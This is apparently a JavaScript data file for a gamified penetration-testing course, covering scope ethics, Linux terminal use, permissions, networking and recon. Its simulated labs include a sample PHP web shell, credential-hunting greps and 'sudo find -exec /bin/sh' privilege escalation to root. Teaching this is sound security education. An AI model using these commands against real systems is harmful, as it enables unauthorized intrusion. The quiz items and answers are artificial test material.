{hint:â€œThe client asks you to also test their employee email server (not in scope). What do you say?â€,accept:[â€œ~scopeâ€,â€œ~updateâ€,â€œ~writingâ€,â€œ~writtenâ€,â€œ~amendmentâ€,â€œ~new scopeâ€,â€œ~addâ€],output:â€œYou requested a scope amendment in writing.\nClient signed the updated ROE adding email server testing.â€,successMsg:â€œNever test anything without written authorization, even if the client verbally asks!â€,example:â€œneed updated scope in writingâ€,quickCmds:[â€œneed updated scope in writingâ€]}
]}
]},
// MASTERY
{id:â€œu1mâ€,title:â€\uD83C\uDFC6 Ethics Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œWhat must you have BEFORE testing a system?â€,opts:[â€œWritten permissionâ€,â€œA VPNâ€,â€œKali Linuxâ€,â€œA degreeâ€],a:â€œWritten permissionâ€,why:â€œNo permission = illegal, period.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™re scanning for a bug bounty. You find a vulnerability on a different companyâ€™s server in the same IP range.â€,q:â€œWhat should you do?â€,opts:[â€œIgnore it \u2014 outside your scopeâ€,â€œExploit it to show impactâ€,â€œReport it to the other companyâ€,â€œPost it on Twitterâ€],a:â€œIgnore it \u2014 outside your scopeâ€,why:â€œTesting outside scope is illegal. You can optionally notify them through proper channels.â€},
{type:â€œtfâ€,q:â€œGrey Hat hackers have permission to test systems.â€,a:false,why:â€œGrey Hats act without permission, even if their intentions arenâ€™t malicious.â€},
{type:â€œorderâ€,q:â€œPentest phases in order:â€,items:[â€œReconnaissanceâ€,â€œScanningâ€,â€œExploitationâ€,â€œPost-Exploitationâ€,â€œReportingâ€],why:â€œThis methodology keeps you organized and legal.â€},
{type:â€œmatchâ€,q:â€œMatch the document:â€,pairs:[[â€œScopeâ€,â€œWhich systems to testâ€],[â€œROEâ€,â€œAllowed methodsâ€],[â€œNDAâ€,â€œKeep findings secretâ€]],why:â€œAll three must be in writing before you start.â€},
]},
]},

// â€“â€“ UNIT 2: TERMINAL BASICS â€“â€“
{id:â€œu2â€,title:â€œTerminal Basicsâ€,desc:â€œNavigate the command lineâ€,levels:[
{id:â€œu2l1â€,title:â€œWhere Am I?â€,rounds:[
{type:â€œteachâ€,text:â€œThe terminal is a text box where you type commands instead of clicking. Think of it like texting your computer \u2014 you type what you want, hit Enter, and it does it. Every hacking tool runs here.â€},
{type:â€œteachâ€,text:â€œYour first two commands: pwd shows which folder youâ€™re in (like checking your GPS). ls -la lists every file in that folder, including hidden ones that start with a dot.â€,detail:â€œpwd = Print Working Directory. Shows the full path of where you are right now.\nls = List. Shows files in the current folder.\n-l = Long format (shows size, owner, permissions).\n-a = All files, including hidden ones that start with a dot (.).\nCombine them: ls -la shows everything with full details.â€},
{type:â€œhackâ€,story:â€œYouâ€™ve just connected to a companyâ€™s server. The screen is black with a blinking cursor. You need to figure out which folder you landed in.â€,q:â€œCheck which folder youâ€™re in. (Hint: pwd)â€,a:[â€œpwdâ€],output:â€/var/www/html\n\nYouâ€™re in the web serverâ€™s main folder.\nThis is where the websiteâ€™s files live.â€,success:â€œYouâ€™re inside a web server! This folder holds the companyâ€™s entire website.â€,why:â€œpwd stands for â€˜print working directoryâ€™ \u2014 it shows your current folder location.â€},
{type:â€œhackâ€,story:â€œNow you know WHERE you are. But you canâ€™t see any files yet. Use ls -la to turn on the lights and see everything \u2014 including hidden files.â€,q:â€œList all files here, including hidden ones. (Hint: ls -la)â€,a:[â€œls -laâ€,â€œls -alâ€],output:â€-rw-râ€“râ€“ 1 root root  4096 Jan 15 index.html\n-rw-râ€“râ€“ 1 root root   890 Jan 15 config.php\ndrwxr-xr-x 2 root root  4096 Jan 15 uploads/\n-rwâ€”â€“â€“ 1 root root    42 Jan 15 .htpasswd\n-rwâ€”â€“â€“ 1 root root    78 Jan 15 .envâ€,success:â€œFound hidden files! .htpasswd stores passwords and .env stores secret settings.â€,why:â€œls = list files. -l = show details (size, owner). -a = show ALL files including hidden ones (files starting with a dot).â€},
]},
{id:â€œu2l2â€,title:â€œMoving & Creatingâ€,rounds:[
{type:â€œteachâ€,text:â€œcd = go to a folder. cd uploads enters the uploads folder. cd .. goes up one level. cd ~ goes home. Tab completion fills in names so you type faster.â€,detail:â€œcd = Change Directory. Moves you to a different folder.\ncd uploads = go INTO the uploads folder.\ncd .. = go UP one folder (the two dots mean â€˜parent folderâ€™).\ncd ~ = go to your home folder.\nTab key = auto-completes file and folder names so you donâ€™t have to type the whole thing.â€},
{type:â€œhackâ€,story:â€œYou spotted a suspicious uploads/ folder. Hackers sometimes upload backdoors through file upload forms. Time to investigate.â€,q:â€œEnter the uploads folder.â€,a:[â€œcd uploadsâ€,â€œcd uploads/â€],output:â€$ pwd\n/var/www/html/uploads\n\n$ ls -la\n-rw-râ€“râ€“ 1 www-data www-data  156 Jan 14 shell.php\n-rw-râ€“râ€“ 1 www-data www-data 2048 Jan 14 image.jpgâ€,success:â€œFound shell.php \u2014 thatâ€™s a web shell backdoor! Someone was here before you.â€,why:â€œcd = change directory. Navigate to investigate suspicious folders.â€},
{type:â€œteachâ€,text:â€œtouch filename = create empty file. mkdir dirname = create folder. rm filename = delete (NO trash can!). rm -r dirname = delete folder and everything inside it.â€},
{type:â€œhackâ€,story:â€œYou need to save evidence of the backdoor before the attacker deletes it. Create a folder to store your findings.â€,q:â€œCreate an evidence folder called â€˜lootâ€™.â€,a:[â€œmkdir lootâ€],output:â€$ ls\nloot/  shell.php  image.jpg\n\nEvidence folder ready.â€,success:â€œNice! Organized hackers are effective hackers.â€,why:â€œmkdir creates directories. Always organize your findings.â€},
{type:â€œtfâ€,q:â€œDeleted files with rm can be recovered from the trash.â€,a:false,why:â€œrm permanently deletes. No recycle bin in the terminal. Gone forever.â€},
]},
{id:â€œu2l3â€,title:â€œCopying, Moving & Readingâ€,rounds:[
{type:â€œteachâ€,text:â€œThree more commands: cat filename reads a file and shows you whatâ€™s inside. grep â€˜wordâ€™ filename searches inside a file for specific text. cp copies files, mv moves or renames them.â€,detail:â€œcat = Concatenate (fancy word for â€˜read and displayâ€™). Shows the contents of any file.\ngrep = Global Regular Expression Print. Searches for text inside files.\ngrep -r = search recursively (all files in all subfolders).\ncp = Copy. Usage: cp original.txt copy.txt\nmv = Move or rename. mv file.txt /tmp/ moves it. mv old.txt new.txt renames it.â€},
{type:â€œhackâ€,story:â€œYou spotted a suspicious file called shell.php in the uploads folder. You need to read it to see what it does. cat prints a fileâ€™s contents on screen.â€,q:â€œRead the suspicious file. (Hint: cat shell.php)â€,a:[â€œcat shell.phpâ€,â€œcat uploads/shell.phpâ€],output:â€<?php\n// Backdoor uploaded 2024-01-14\n$cmd = $_GET['cmd'];\nsystem($cmd);\n// Password: shadow_agent_77\n?>â€,success:â€œItâ€™s a backdoor with a hardcoded password! Someone planted this to control the server remotely.â€,why:â€œcat reads a file and shows its contents. Essential for reading configs, code, and logs.â€},
{type:â€œhackâ€,story:â€œThat backdoor had a password inside it. There could be more passwords hiding in OTHER files on this server. grep searches inside files for specific words.â€,q:â€œSearch ALL files for the word â€˜passwordâ€™. (Hint: grep -r password .)â€,a:[â€œgrep -r â€˜passwordâ€™ .â€,â€œgrep -r password .â€,â€œgrep -ri password .â€,â€œgrep -ri â€˜passwordâ€™ .â€],output:â€./config.php:$db_password = â€˜r00tme_2024â€™;\n./shell.php:// Password: shadow_agent_77\n./.env:DB_PASSWORD=supersecret123â€,success:â€œThree passwords found across multiple files! Major finding.â€,why:â€œgrep searches for text inside files. -r means search every file in every subfolder. The dot (.) means start from the current folder.â€,quickCmds:[â€œgrep -r password .â€]},
{type:â€œpickâ€,q:â€œWhat does mv file.txt /tmp/ do?â€,opts:[â€œMoves the file to /tmp/â€,â€œCopies itâ€,â€œDeletes itâ€,â€œRenames itâ€],a:â€œMoves the file to /tmp/â€,why:â€œmv to a directory = move. mv old.txt new.txt = rename.â€},
]},
// LAB
{id:â€œu2labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Find the Flagâ€,rounds:[
{type:â€œlabâ€,title:â€œFind the Flagâ€,objective:â€œNavigate a compromised server and find the hidden flag.â€,banner:â€œConnected to target 10.10.10.44â€¦\n$ whoami\nwww-data\nâ€,steps:[
{hint:â€œCheck where you are.â€,accept:[â€œpwdâ€,â€œ~pwdâ€],output:â€/var/www/htmlâ€,successMsg:â€œYouâ€™re in the web root.â€,example:â€œpwdâ€,quickCmds:[â€œpwdâ€]},
{hint:â€œList all files including hidden ones.â€,accept:[â€œls -laâ€,â€œls -alâ€],output:â€-rw-râ€“râ€“ 1 root root  1245 Jan 15 index.html\n-rw-râ€“râ€“ 1 root root   340 Jan 15 style.css\ndrwxr-xr-x 2 root root  4096 Jan 15 uploads/\n-rwâ€”â€“â€“ 1 root root    42 Jan 15 .secret_noteâ€,successMsg:â€œFound a hidden file: .secret_note!â€,example:â€œls -laâ€,quickCmds:[â€œls -laâ€]},
{hint:â€œRead the hidden note.â€,accept:[â€œcat .secret_noteâ€,â€œ~cat .secretâ€],output:â€œThe real prize is in /opt/backup/â€,successMsg:â€œA clue! Check /opt/backup/â€,example:â€œcat .secret_noteâ€,quickCmds:[â€œcat .secret_noteâ€]},
{hint:â€œGo to /opt/backup/ and find the flag.â€,accept:[â€œcd /opt/backupâ€,â€œ~ls /optâ€,â€œ~cat /optâ€,â€œ~find /optâ€,â€œls /opt/backupâ€],output:â€-rw-râ€“râ€“ 1 root root  340 Jan 15 config.bak\n-rw-râ€“râ€“ 1 root root   32 Jan 15 .flag.txtâ€,successMsg:â€œFound it!â€,example:â€œcd /opt/backupâ€,quickCmds:[â€œcd /opt/backupâ€]},
{hint:â€œRead the flag!â€,accept:[â€œcat .flag.txtâ€,â€œ~cat .flagâ€,â€œcat /opt/backup/.flag.txtâ€],output:â€œFLAG{y0u_f0und_th3_h1dd3n_fl4g}â€,successMsg:â€œFLAG CAPTURED! You used pwd, ls, cat, and cd to navigate and find a hidden flag.â€,example:â€œcat .flag.txtâ€,quickCmds:[â€œcat .flag.txtâ€]}
]}
]},
// MASTERY
{id:â€œu2mâ€,title:â€\uD83C\uDFC6 Terminal Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œShow your current location:â€,a:[â€œpwdâ€,â€œecho $PWDâ€],why:â€œpwd = print working directory.â€},
{type:â€œtypeâ€,q:â€œList everything including hidden files:â€,a:[â€œls -laâ€,â€œls -alâ€],why:â€-l for details, -a for hidden.â€},
{type:â€œtypeâ€,q:â€œGo up one directory:â€,a:[â€œcd ..â€,â€œcd ../â€],why:â€.. = parent directory.â€},
{type:â€œtypeâ€,q:â€œCreate a folder called tools:â€,a:[â€œmkdir toolsâ€,â€œmkdir ./toolsâ€],why:â€œmkdir creates directories.â€},
{type:â€œtypeâ€,q:â€œSearch all files for â€˜passwordâ€™:â€,a:[â€œgrep -r â€˜passwordâ€™ .â€,â€œgrep -r password .â€,â€œgrep -ri password .â€],why:â€-r searches recursively.â€},
{type:â€œpickâ€,q:â€œWhich command renames a file?â€,opts:[â€œmvâ€,â€œcpâ€,â€œrnâ€,â€œrenameâ€],a:â€œmvâ€,why:â€œmv with two filenames = rename.â€},
]},
]},

// â€“â€“ UNIT 3: PIPES & LINUX â€“â€“
{id:â€œu3â€,title:â€œPipes & Linuxâ€,desc:â€œChain commands, permissions, and key filesâ€,levels:[
{id:â€œu3l1â€,title:â€œPipes & Redirectionâ€,rounds:[
{type:â€œteachâ€,text:â€œThe pipe symbol | is your secret weapon. It takes the output of one command and feeds it into another. Example: cat /etc/passwd shows ALL user accounts, but cat /etc/passwd | grep bash filters for ONLY the ones who can actually log in.â€,detail:â€| (pipe) = takes what one command outputs and feeds it as input to the next command.\nThink of it like an assembly line: each command does one job and passes the result along.\nYou can chain as many as you want: command1 | command2 | command3â€},
{type:â€œteachâ€,text:â€/etc/passwd is a file on every Linux machine listing all user accounts. We already know cat reads files and grep searches for text. Chain them with | to filter the huge list down to what matters.â€},
{type:â€œhackâ€,story:â€œYouâ€™ve broken into a Linux server. The user list has dozens of system accounts you donâ€™t care about. Use a pipe to show only the ones with real login access (bash).â€,q:â€œList only users who can log in. (Hint: cat /etc/passwd | grep bash)â€,a:[â€œcat /etc/passwd | grep bashâ€,â€œgrep bash /etc/passwdâ€],output:â€œroot:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\ndev_ops:x:1001:1001::/home/dev_ops:/bin/bash\nbackup:x:1002:1002::/home/backup:/bin/bash\n\n4 users with login access.â€,success:â€œ4 real accounts found! root, admin, dev_ops, and backup are your targets.â€,why:â€œThe pipe | sends the full user list into grep, which filters for lines containing â€˜bashâ€™.â€,quickCmds:[â€œcat /etc/passwd | grep bashâ€]},
{type:â€œteachâ€,text:â€> saves output to a file (overwrites it). >> adds to the end of a file. Example: nmap target > results.txt saves your scan results to read later.â€},
{type:â€œbuildâ€,q:â€œBuild: list just the usernames with bash accessâ€,parts:[â€œcat /etc/passwdâ€,â€|â€,â€œgrep bashâ€,â€|â€,â€œcut -d: -f1â€],answer:[â€œcat /etc/passwdâ€,â€|â€,â€œgrep bashâ€,â€|â€,â€œcut -d: -f1â€],why:â€œEach | passes data to the next command. cut -d: -f1 grabs just the first piece (the username) from each line.â€},
]},
{id:â€œu3l2â€,title:â€œFile Permissionsâ€,rounds:[
{type:â€œteachâ€,text:â€œFile permissions: Read=4, Write=2, Execute=1. Add them up \u2014 7 means all three (4+2+1). chmod 755 = owner gets full access (7), everyone else can read and run but not change (5).â€},
{type:â€œpickâ€,q:â€œchmod 777 means:â€,opts:[â€œEveryone can read, write, AND run the fileâ€,â€œOnly the owner has accessâ€,â€œNobody can access itâ€,â€œRead-only for everyoneâ€],a:â€œEveryone can read, write, AND run the fileâ€,why:â€œ7 = read+write+execute for ALL three groups. Very dangerous if on a sensitive file!â€},
{type:â€œteachâ€,text:â€œSUID is like a master key taped to a program. When a program has SUID set, it runs with the OWNERâ€™s power (usually the admin), no matter who runs it. The command find / -perm -4000 searches the entire computer for these special programs.â€},
{type:â€œhackâ€,story:â€œYouâ€™re a low-level user on this server. You need to find programs that have the SUID â€˜master keyâ€™ \u2014 programs that run with admin power even when YOU run them. If you find one you can trick, you become admin instantly.â€,q:â€œSearch the whole system for SUID programs. (Hint: find / -perm -4000)â€,a:[â€œfind / -perm -4000â€,â€œfind / -perm -4000 2>/dev/nullâ€],output:â€/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find       \u2190 \uD83D\uDEA8 Exploitable!\n/usr/bin/python3    \u2190 \uD83D\uDEA8 Exploitable!\n/usr/bin/vim        \u2190 \uD83D\uDEA8 Exploitable!\n/usr/bin/nmap\n\n6 SUID programs found. 3 can be abused!â€,success:â€œfind, python3, AND vim all run with admin power! Each one can be tricked into giving you a full admin shell.â€,why:â€œfind / -perm -4000 searches for programs with the SUID bit. These are your best path to becoming admin.â€,quickCmds:[â€œfind / -perm -4000 2>/dev/nullâ€]},
]},
{id:â€œu3l3â€,title:â€œKey Files & Usersâ€,rounds:[
{type:â€œteachâ€,text:â€œLinux stores important stuff in set places: /etc/passwd lists all user accounts. /etc/shadow has the scrambled passwords (only the admin can read it). /tmp is a junk drawer anyone can write to. /var/log has records of everything that happened.â€},
{type:â€œmatchâ€,q:â€œMatch the folder to whatâ€™s inside:â€,pairs:[[â€/etc/shadowâ€,â€œScrambled passwordsâ€],[â€/tmpâ€,â€œAnyone can write hereâ€],[â€/var/logâ€,â€œActivity recordsâ€],[â€~/.bash_historyâ€,â€œPast commands typedâ€]],why:â€œKnowing where things are stored is essential when you break into a system.â€},
{type:â€œteachâ€,text:â€œsudo lets you run a command as the admin (root). sudo -l shows which commands YOUâ€™RE allowed to run as admin. This is the VERY FIRST thing you check after breaking in \u2014 sometimes they accidentally gave you admin access to a powerful command.â€,detail:â€œsudo = Super User Do. Runs a command with admin (root) powers.\nsudo -l = List what YOU can run as admin. This is your #1 check after getting into any system.\nIf it shows something like (root) NOPASSWD: /usr/bin/find that means you can run find as admin without even needing a password!â€},
{type:â€œhackâ€,story:â€œYouâ€™ve broken into a server as a low-level user. Check if the admin accidentally gave you permission to run any commands with full admin power.â€,q:â€œSee what you can run as admin. (Hint: sudo -l)â€,a:[â€œsudo -lâ€,â€œsudo -llâ€],output:â€œUser www-data may run the following:\n  (root) NOPASSWD: /usr/bin/find\n  (root) NOPASSWD: /usr/bin/python3\n\nYou can run find AND python3 as admin!â€,success:â€œJackpot! You can run find and python3 as root. Both can be abused to take over the whole machine.â€,why:â€œsudo -l lists commands you can run as admin. If you find something exploitable, you can become root.â€,quickCmds:[â€œsudo -lâ€]},
]},
// LAB
{id:â€œu3labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Privesc Checkâ€,rounds:[
{type:â€œlabâ€,title:â€œPrivesc Checkâ€,objective:â€œCheck a compromised server for privilege escalation paths.â€,banner:â€œConnected as www-data@target\n$ whoami\nwww-data\nâ€,steps:[
{hint:â€œCheck what you can run as root.â€,accept:[â€œsudo -lâ€,â€œ~sudo -lâ€,â€œ~sudoâ€],output:â€œUser www-data may run the following:\n  (root) NOPASSWD: /usr/bin/findâ€,successMsg:â€œYou can run find as root! Thatâ€™s a privesc vector.â€,example:â€œsudo -lâ€,quickCmds:[â€œsudo -lâ€]},
{hint:â€œLook for SUID binaries.â€,accept:[â€œfind / -perm -4000â€,â€œ~find / -perm -4000â€],output:â€/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/python3â€,successMsg:â€œfind AND python3 have SUID!â€,example:â€œfind / -perm -4000 2>/dev/nullâ€,quickCmds:[â€œfind / -perm -4000 2>/dev/nullâ€]},
{hint:â€œCheck /etc/passwd for users with shell access.â€,accept:[â€œ~cat /etc/passwdâ€,â€œ~grep bashâ€,â€œcat /etc/passwd | grep bashâ€],output:â€œroot:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bashâ€,successMsg:â€œTwo users with bash: root and admin.â€,example:â€œcat /etc/passwd | grep bashâ€,quickCmds:[â€œcat /etc/passwd | grep bashâ€]},
{hint:â€œUse sudo find to get a root shell!â€,accept:[â€œsudo find . -exec /bin/sh \;â€,â€œ~sudo findâ€,â€œsudo find . -exec /bin/bash \;â€],output:â€# whoami\nrootâ€,successMsg:â€œROOT! sudo find -exec spawns a shell as root. Full privesc!â€,example:â€œsudo find . -exec /bin/sh \;â€,quickCmds:[â€œsudo find . -exec /bin/sh \;â€]}
]}
]},
// MASTERY
{id:â€œu3mâ€,title:â€\uD83C\uDFC6 Pipes & Linux Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œList files and filter for â€˜confâ€™:â€,a:[â€œls | grep confâ€,â€œls -la | grep confâ€,â€œls -al | grep confâ€],why:â€œPipe ls to grep for filtering.â€},
{type:â€œpickâ€,q:â€œchmod 644 means:â€,opts:[â€œOwner read+write, others read onlyâ€,â€œFull accessâ€,â€œNo accessâ€,â€œOwner onlyâ€],a:â€œOwner read+write, others read onlyâ€,why:â€œ6=rw-, 4=râ€“, 4=râ€“.â€},
{type:â€œtypeâ€,q:â€œFind SUID binaries:â€,a:[â€œfind / -perm -4000â€,â€œfind / -perm -4000 2>/dev/nullâ€],why:â€œSUID files run as their owner.â€},
{type:â€œtypeâ€,q:â€œCheck sudo privileges:â€,a:[â€œsudo -lâ€,â€œsudo -llâ€,â€œsudo â€“listâ€],why:â€œFirst privilege escalation check.â€},
{type:â€œmatchâ€,q:â€œMatch:â€,pairs:[[â€/etc/passwdâ€,â€œUser accountsâ€],[â€/etc/shadowâ€,â€œPassword hashesâ€],[â€/tmpâ€,â€œDrop tools hereâ€]],why:â€œKnow your filesystem.â€},
]},
]},

// â€“â€“ UNIT 4: NETWORKING â€“â€“
{id:â€œu4â€,title:â€œNetworkingâ€,desc:â€œIPs, ports, and protocolsâ€,levels:[
{id:â€œu4l1â€,title:â€œIPs & Portsâ€,rounds:[
{type:â€œteachâ€,text:â€œEvery computer on a network has an IP address \u2014 like a home address so other computers can find it. Example: 10.10.10.5. A port is like an apartment number at that address. Each service (website, email, file sharing) uses a different port number.â€},
{type:â€œteachâ€,text:â€œCommon ports to memorize: 21 = FTP (file transfer). 22 = SSH (remote control of another computer). 80 = HTTP (websites). 443 = HTTPS (secure websites). 445 = SMB (file sharing). 3306 = MySQL (database). 3389 = RDP (Windows remote desktop).â€},
{type:â€œmatchâ€,q:â€œMatch the port number to its service:â€,pairs:[[â€œ22â€,â€œSSH (remote control)â€],[â€œ80â€,â€œHTTP (websites)â€],[â€œ443â€,â€œHTTPS (secure web)â€],[â€œ3389â€,â€œRDP (Windows remote desktop)â€]],why:â€œYouâ€™ll see these ports on every scan. Memorize them.â€},
{type:â€œpickâ€,q:â€œA website usually runs on port:â€,opts:[â€œ80â€,â€œ22â€,â€œ445â€,â€œ3389â€],a:â€œ80â€,why:â€œHTTP (regular websites) = port 80. HTTPS (secure websites) = port 443.â€},
]},
{id:â€œu4l2â€,title:â€œTCP, UDP & Subnetsâ€,rounds:[
{type:â€œteachâ€,text:â€œTCP is like a phone call \u2014 both sides confirm the connection before talking. It goes: â€˜Hey can we talk?â€™ (SYN) \u2192 â€˜Sure!â€™ (SYN-ACK) \u2192 â€˜Cool, here we goâ€™ (ACK). This is called the 3-way handshake. Most services use TCP because itâ€™s reliable.â€},
{type:â€œpickâ€,q:â€œThe 3-way handshake order is:â€,opts:[â€œSYN \u2192 SYN-ACK \u2192 ACKâ€,â€œACK \u2192 SYN \u2192 FINâ€,â€œPING \u2192 PONG \u2192 GOâ€,â€œGET \u2192 POST \u2192 PUTâ€],a:â€œSYN \u2192 SYN-ACK \u2192 ACKâ€,why:â€œSYN starts the call, SYN-ACK picks up, ACK confirms. Then data flows.â€},
{type:â€œteachâ€,text:â€œUDP is like shouting across a room \u2014 fast but no guarantee anyone heard you. A subnet is a group of computers on the same network. 10.10.10.0/24 means 254 computers from 10.10.10.1 to 10.10.10.254 are in the group.â€},
{type:â€œpickâ€,q:â€œA /24 network contains how many usable addresses?â€,opts:[â€œ254â€,â€œ256â€,â€œ128â€,â€œ65534â€],a:â€œ254â€,why:â€œ256 total minus 2 reserved ones (network address and broadcast) = 254 usable.â€},
]},
{id:â€œu4l3â€,title:â€œYour Network Infoâ€,rounds:[
{type:â€œteachâ€,text:â€œBefore hacking a network, know YOUR OWN address. ip addr shows your IP. ping checks if a target is online. nmap scans whole networks for live machines (youâ€™ll master it next unit).â€,detail:â€œip addr = shows your IP address on each network connection.\nping [IP] = sends â€˜are you there?â€™ to a computer. Reply = itâ€™s online.\nping -c 4 [IP] = send exactly 4 pings then stop.\nnmap -sn [network] = quick ping sweep to find live hosts.â€},
{type:â€œhackâ€,story:â€œYouâ€™ve plugged into MegaCorpâ€™s office network. Before scanning anything, you need to know your own address on this network so you can receive data back.â€,q:â€œFind your IP address. (Hint: ip addr)â€,a:[â€œip addrâ€,â€œifconfigâ€,â€œip aâ€],output:â€œeth0: flags=4163<UP,RUNNING>\n    inet 10.10.10.50/24\n    ether 08:00:27:a3:b5:c7\n\nYouâ€™re 10.10.10.50 on the network.â€,success:â€œYouâ€™re 10.10.10.50. Youâ€™ll need this address whenever you set up a listener or reverse connection.â€,why:â€œip addr shows all your network connections and IP addresses. Always check this first.â€,quickCmds:[â€œip addrâ€]},
{type:â€œhackâ€,story:â€œYour target server should be at 10.10.10.5. Before wasting time scanning it, check if itâ€™s even turned on.â€,q:â€œCheck if 10.10.10.5 is online. (Hint: ping)â€,a:[â€œping 10.10.10.5â€,â€œping -c 4 10.10.10.5â€],output:â€œ64 bytes from 10.10.10.5: time=0.8ms\n64 bytes from 10.10.10.5: time=0.6ms\n\n2 packets sent, 2 received, 0% lossâ€,success:â€œItâ€™s alive and responding fast! Itâ€™s on the same network as you.â€,why:â€œping sends a small message and waits for a reply. If you get a response, the target is online.â€,quickCmds:[â€œping 10.10.10.5â€]},
{type:â€œtfâ€,q:â€œScanning computers outside your authorized scope is illegal.â€,a:true,why:â€œYour scope document lists exactly which systems youâ€™re allowed to test. Anything else = unauthorized = criminal.â€},
]},
// LAB
{id:â€œu4labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Network Reconâ€,rounds:[
{type:â€œlabâ€,title:â€œNetwork Reconâ€,objective:â€œMap the local network and identify live hosts.â€,banner:â€œYouâ€™re on the internal network: 10.10.10.0/24\nYour IP: 10.10.10.50\nâ€,steps:[
{hint:â€œConfirm your own IP address.â€,accept:[â€œip addrâ€,â€œifconfigâ€,â€œip aâ€,â€œ~ip addrâ€],output:â€œeth0: 10.10.10.50/24â€,successMsg:â€œYour IP is 10.10.10.50.â€,example:â€œip addrâ€,quickCmds:[â€œip addrâ€]},
{hint:â€œPing the gateway to check connectivity.â€,accept:[â€œping 10.10.10.1â€,â€œ~pingâ€],output:â€œ64 bytes from 10.10.10.1: icmp_seq=1 ttl=64 time=1.2ms\n4 packets, 0% lossâ€,successMsg:â€œGateway is alive!â€,example:â€œping 10.10.10.1â€,quickCmds:[â€œping 10.10.10.1â€]},
{hint:â€œScan the subnet for live hosts.â€,accept:[â€œnmap -sn 10.10.10.0/24â€,â€œ~nmap -snâ€,â€œ~nmap 10.10.10â€],output:â€œ10.10.10.1   - Router\n10.10.10.10  - Host up\n10.10.10.22  - Host up\n10.10.10.50  - Host up (you)\n10.10.10.88  - Host up\n5 hosts upâ€,successMsg:â€œFound 4 other hosts on the network! Time to scan them.â€,example:â€œnmap -sn 10.10.10.0/24â€,quickCmds:[â€œnmap -sn 10.10.10.0/24â€]}
]}
]},
// MASTERY
{id:â€œu4mâ€,title:â€\uD83C\uDFC6 Networking Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œmatchâ€,q:â€œMatch port to service:â€,pairs:[[â€œ21â€,â€œFTPâ€],[â€œ22â€,â€œSSHâ€],[â€œ80â€,â€œHTTPâ€],[â€œ445â€,â€œSMBâ€]],why:â€œMemorize common ports.â€},
{type:â€œpickâ€,q:â€œTCPâ€™s handshake order:â€,opts:[â€œSYN, SYN-ACK, ACKâ€,â€œACK, SYN, FINâ€,â€œUDP, TCP, ICMPâ€,â€œGET, POST, PUTâ€],a:â€œSYN, SYN-ACK, ACKâ€,why:â€œThe 3-way handshake.â€},
{type:â€œtypeâ€,q:â€œShow your IP:â€,a:[â€œip addrâ€,â€œifconfigâ€,â€œip aâ€],why:â€œKnow your own IP.â€},
{type:â€œpickâ€,q:â€/24 = how many usable IPs?â€,opts:[â€œ254â€,â€œ256â€,â€œ128â€,â€œ65534â€],a:â€œ254â€,why:â€œ256 minus network and broadcast.â€},
]},
]},
]};

var SEC2 = {
id:â€œs2â€,title:â€œReconnaissance & Scanningâ€,tier:â€œbasicâ€,icon:â€\uD83D\uDD0Dâ€,color:â€œvar(â€“blue)â€,
desc:â€œFind targets, map networks, discover vulnerabilitiesâ€,
units:[
// â€“â€“ UNIT 5: PASSIVE RECON â€“â€“
{id:â€œu5â€,title:â€œPassive Reconâ€,desc:â€œGather intel without touching the targetâ€,levels:[
{id:â€œu5l1â€,title:â€œOSINT & Google Dorkingâ€,rounds:[
{type:â€œteachâ€,text:â€œOSINT = gathering intel from public sources. Google, social media, job postings. The target has NO idea youâ€™re investigating them. Google dorking uses advanced operators to find hidden files and pages.â€},
{type:â€œhackâ€,story:â€œClient wants you to investigate NovaTech Corp. Before touching their servers, see what Google already knows. Use a Google dork to find exposed PDF documents on their site.â€,q:â€œFind all PDFs on novatech.com via Google.â€,a:[â€œsite:novatech.com filetype:pdfâ€,â€œsite:target.com filetype:pdfâ€,â€œfiletype:pdf site:novatech.comâ€],output:â€œResults:\n\u2022 novatech.com/docs/employee-handbook.pdf\n\u2022 novatech.com/hr/salary-bands-2024.pdf\n\u2022 novatech.com/internal/network-diagram.pdf\n\u2022 novatech.com/backup/db-credentials.pdfâ€,success:â€œNetwork diagram AND database credentials exposed publicly! Critical finding without ever touching their servers.â€,why:â€œGoogle dorking reveals files the admin forgot to protect. site: limits to one domain, filetype: filters by extension.â€,quickCmds:[â€œsite:novatech.com filetype:pdfâ€]},
{type:â€œpickâ€,q:â€œOSINT gathering is:â€,opts:[â€œLegal \u2014 it uses public infoâ€,â€œIllegal without permissionâ€,â€œGovernment onlyâ€,â€œRequires special toolsâ€],a:â€œLegal \u2014 it uses public infoâ€,why:â€œYouâ€™re just searching public sources. No laws broken.â€},
]},
{id:â€œu5l2â€,title:â€œWHOIS & DNSâ€,rounds:[
{type:â€œteachâ€,text:â€œYouâ€™ve been hired to investigate SecureVault Inc. Time to look up whoâ€™s behind their domain. whois shows registration info. dig reveals DNS records \u2014 IP addresses, mail servers, and sometimes secrets hidden in TXT records.â€},
{type:â€œtypeâ€,q:â€\uD83D\uDD0D Intel mission: look up who registered securevault.comâ€,a:[â€œwhois securevault.comâ€,â€œwhois target.comâ€],why:â€œWHOIS reveals names, emails, phone numbers \u2014 all useful for social engineering.â€},
{type:â€œpickâ€,q:â€œYou run dig and find an A record pointing to 104.21.56.78. What did you just discover?â€,opts:[â€œThe serverâ€™s IP addressâ€,â€œThe adminâ€™s emailâ€,â€œThe mail serverâ€,â€œA hidden subdomainâ€],a:â€œThe serverâ€™s IP addressâ€,why:â€œA records map domain names to IP addresses. Now you know where the server lives.â€},
{type:â€œtypeâ€,q:â€\uD83D\uDD0D Now pull DNS records to find their mail server:â€,a:[â€œdig securevault.comâ€,â€œdig target.comâ€,â€œnslookup securevault.comâ€],why:â€œMX records reveal mail servers \u2014 another attack surface to investigate.â€},
]},
{id:â€œu5l3â€,title:â€œSubdomain Discoveryâ€,rounds:[
